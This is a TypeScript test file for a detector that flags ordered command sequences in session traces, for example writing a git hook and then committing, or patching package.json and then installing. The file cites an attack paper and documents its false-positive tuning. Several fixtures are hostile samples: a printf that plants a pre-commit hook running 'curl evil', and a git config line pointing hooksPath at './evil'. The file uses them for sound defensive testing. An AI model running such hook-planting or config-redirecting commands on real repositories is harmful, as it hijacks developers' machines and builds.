import { describe, expect, it } from 'vitest';
import {
  affectedChannels,
  compositionEdges,
  STATE_CHANNELS,
  type TraceStep,
} from './command-composition.js';

/**
 * Command-composition edges (P8-SEC-01, Q-05, MOSAIC arXiv:2607.02857).
 *
 * The detection tests use the paper's own attack shape: individually harmless
 * commands whose *order* creates the capability. The false-positive tests use
 * shapes from real build pipelines, because a detector that fires on `npm ci`
 * is a detector somebody switches off in a week.
 */

const step = (index: number, command: string, ...wrote: string[]): TraceStep => ({
  index,
  command,
  wrote,
});

describe('detection — the shapes MOSAIC describes', () => {
  it('links a written git hook to the git operation that fires it', () => {
    const edges = compositionEdges([
      step(0, "printf '#!/bin/sh\\ncurl evil' > .git/hooks/pre-commit", '.git/hooks/pre-commit'),
      step(1, 'git add -A'),
      step(2, 'git commit -m "wip"'),
    ]);
    expect(edges).toHaveLength(1);
    expect(edges[0]).toMatchObject({ channel: 'git-hook', producer: 0, consumer: 2 });
  });

  it('links a manifest write to the package manager that runs its lifecycle scripts', () => {
    const edges = compositionEdges([
      step(0, 'node patch-manifest.js', 'package.json'),
      step(1, 'pnpm install'),
    ]);
    expect(edges).toHaveLength(1);
    expect(edges[0]?.channel).toBe('package-lifecycle');
  });

  it('links a .gitmodules write to a submodule update', () => {
    const edges = compositionEdges([
      step(0, 'edit', '.gitmodules'),
      step(1, 'git submodule update --init'),
    ]);
    expect(edges[0]?.channel).toBe('submodule');
  });

  it('links a git config change to the fetch that reads it', () => {
    // The producer here is recognised from the *command*, because `git config`
    // writes through git rather than through a path the session records.
    const edges = compositionEdges([
      step(0, 'git config core.hooksPath ./evil'),
      step(1, 'git fetch origin'),
    ]);
    expect(edges[0]).toMatchObject({ channel: 'git-config', producer: 0 });
  });

  it('reports every producer for one consumer, not just the nearest', () => {
    // Two hooks written by different steps are two facts. Collapsing them
    // hides the second, which is the one somebody added later.
    const edges = compositionEdges([
      step(0, 'w1', '.git/hooks/pre-commit'),
      step(1, 'w2', '.git/hooks/commit-msg'),
      step(2, 'git commit -m x'),
    ]);
    expect(edges).toHaveLength(2);
    expect(edges.map((e) => e.producer)).toEqual([0, 1]);
  });

  it('carries an explanation naming the specific state', () => {
    const edges = compositionEdges([step(0, 'w', '.git/hooks/pre-push'), step(1, 'git push')]);
    expect(edges[0]?.because).toContain('.git/hooks/pre-push');
    expect(edges[0]?.via).toBe('.git/hooks/pre-push');
  });
});

describe('order is the whole point', () => {
  it('finds nothing when the consumer runs first', () => {
    const edges = compositionEdges([
      step(0, 'git commit -m x'),
      step(1, 'w', '.git/hooks/pre-commit'),
    ]);
    expect(edges).toEqual([]);
  });

  it('does not let a step consume its own write', () => {
    // The write happens as part of running the step, so no earlier command
    // chose it — and a self-edge would fire on every `git commit` that touches
    // a hook as part of its own work.
    expect(compositionEdges([step(0, 'git commit -m x', '.git/hooks/pre-commit')])).toEqual([]);
  });

  it('reads the recorded index rather than array position', () => {
    const edges = compositionEdges([
      step(9, 'git commit -m x'),
      step(2, 'w', '.git/hooks/pre-commit'),
    ]);
    expect(edges).toHaveLength(1);
    expect(edges[0]).toMatchObject({ producer: 2, consumer: 9 });
  });
});

describe('false positives — real build pipelines', () => {
  it('does not fire on an ordinary install-then-build', () => {
    expect(
      compositionEdges([
        step(0, 'pnpm install --frozen-lockfile'),
        step(1, 'pnpm run build'),
        step(2, 'pnpm run test'),
      ]),
    ).toEqual([]);
  });

  it('does not fire on a repository that already had hooks', () => {
    // Every project with a pre-commit hook. The producer must be *this
    // session's write*, which is the distinction that makes the rate usable.
    expect(compositionEdges([step(0, 'git commit -m "feat: x"')])).toEqual([]);
  });

  it('does not fire on a build that writes into the source tree', () => {
    expect(
      compositionEdges([
        step(0, 'tsc --build', 'packages/core/dist/index.js'),
        step(1, 'node scripts/verify.mjs'),
      ]),
    ).toEqual([]);
  });

  it('does not fire on git commands that execute no hooks', () => {
    expect(
      compositionEdges([
        step(0, 'w', '.git/hooks/pre-commit'),
        step(1, 'git status --porcelain'),
        step(2, 'git log --oneline -1'),
        step(3, 'git diff --name-only'),
      ]),
    ).toEqual([]);
  });

  it('does not fire on `pnpm add` then `pnpm install`', () => {
    // The most ordinary sequence in any repository. The first version fired on
    // it, and it was three of the five flagged traces in the spike — all three
    // installs. A package manager is not a producer on its own channel.
    expect(
      compositionEdges([
        step(0, 'pnpm add -D vitest', 'package.json', 'pnpm-lock.yaml'),
        step(1, 'pnpm install'),
      ]),
    ).toEqual([]);
  });

  it('still fires when something other than a package manager patches the manifest', () => {
    // The narrowing must not remove the detection. A script rewriting
    // `package.json` and then an install is the pattern.
    const edges = compositionEdges([
      step(0, 'node patch.js', 'package.json'),
      step(1, 'pnpm install'),
    ]);
    expect(edges).toHaveLength(1);
  });

  it('does not link a written binary to every later command', () => {
    // The first version's `path-shadowing` consumer was "any non-empty
    // command", which is true of the threat model and useless as a detector:
    // one write into `./bin/` linked to every subsequent step, and a 96-step CI
    // job produced 95 edges from a single write. Measured on real pipelines it
    // was 653 of 656 total edges — 99.5% of the output from one rule.
    const edges = compositionEdges([
      step(0, 'cp ./dist/tool ./bin/tool', './bin/tool'),
      step(1, 'echo building'),
      step(2, 'ls -la'),
      step(3, 'make test'),
    ]);
    expect(edges).toEqual([]);
  });

  it('does fire when the written binary is actually invoked', () => {
    // Kept, because narrowing a rule until it detects nothing is the other way
    // to get a clean false-positive rate.
    const edges = compositionEdges([
      step(0, 'cp ./dist/linux_amd64/release/rad ./bin/rad', './bin/rad'),
      step(1, 'rad version'),
    ]);
    expect(edges).toHaveLength(1);
    expect(edges[0]?.channel).toBe('path-shadowing');
  });

  it('does not fire when the name only appears as an argument', () => {
    const edges = compositionEdges([
      step(0, 'cp x ./bin/rad', './bin/rad'),
      step(1, 'ls -la ./bin/rad'),
      step(2, 'echo "run rad later"'),
    ]);
    expect(edges).toEqual([]);
  });
});

describe('reporting', () => {
  it('summarises channels rather than scoring them', () => {
    // A severity score invites a threshold, a threshold becomes a gate, and a
    // gate on a detector whose false-positive rate is what this spike set out
    // to measure is the wrong order to do things in.
    const edges = compositionEdges([
      step(0, 'w', '.git/hooks/pre-commit'),
      step(1, 'w2', 'package.json'),
      step(2, 'git commit -m x'),
      step(3, 'npm ci'),
    ]);
    expect(affectedChannels(edges)).toEqual(['git-hook', 'package-lifecycle']);
  });

  it('covers five of the thirteen families, and the list says which', () => {
    // A detector that half-parses a shell is worse than one that admits its
    // scope. This pins the scope so it cannot quietly grow by accident.
    expect([...STATE_CHANNELS]).toEqual([
      'git-hook',
      'package-lifecycle',
      'path-shadowing',
      'git-config',
      'submodule',
    ]);
  });

  it('sorts by consumer, then producer, then channel', () => {
    // Two runs over the same trace must produce the same report. Rules are
    // evaluated channel by channel, so insertion order groups by channel — the
    // opposite of what a reader scanning a trace wants.
    const edges = compositionEdges([
      step(0, 'w', '.git/hooks/pre-commit'),
      step(1, 'patch', 'package.json'),
      step(2, 'pnpm install'),
      step(3, 'git commit -m x'),
    ]);
    expect(edges.map((e) => [e.consumer, e.channel])).toEqual([
      [2, 'package-lifecycle'],
      [3, 'git-hook'],
    ]);
  });

  it('returns nothing for an empty trace, which is not a safety claim', () => {
    expect(compositionEdges([])).toEqual([]);
    expect(affectedChannels([])).toEqual([]);
  });
});
